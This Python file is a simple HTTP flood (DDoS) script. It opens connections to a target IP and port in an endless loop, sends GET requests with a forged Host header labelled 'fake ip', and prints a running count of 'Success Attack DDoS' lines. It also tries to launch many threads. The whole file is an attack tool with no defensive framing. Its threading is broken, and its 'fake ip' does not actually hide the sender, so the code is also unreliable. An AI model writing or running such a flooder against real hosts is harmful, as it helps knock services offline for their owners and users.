import socket
import threading

num_attack = 0

def attack(ip_target, fake_ip, port):
  while True:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((ip_target, port))
    soc.sendto(("GET /" + ip_target + " HTTP/1.1\r\n").encode("ascii"), (ip_target, port))
    soc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (ip_target, port))
    global num_attack
    num_attack += 1
    print(f"\033[31m{num_attack}\033[0m. Success Attack DDoS | target: \033[32m{ip_target}\033[0m | fake ip: \033[36m{fake_ip}\033[0m")
    soc.close()

def run(many_attack, tar, fake, port):
  for i in range(many_attack):
    thread = threading.Thread(target=attack(tar, fake, port))
    thread.start()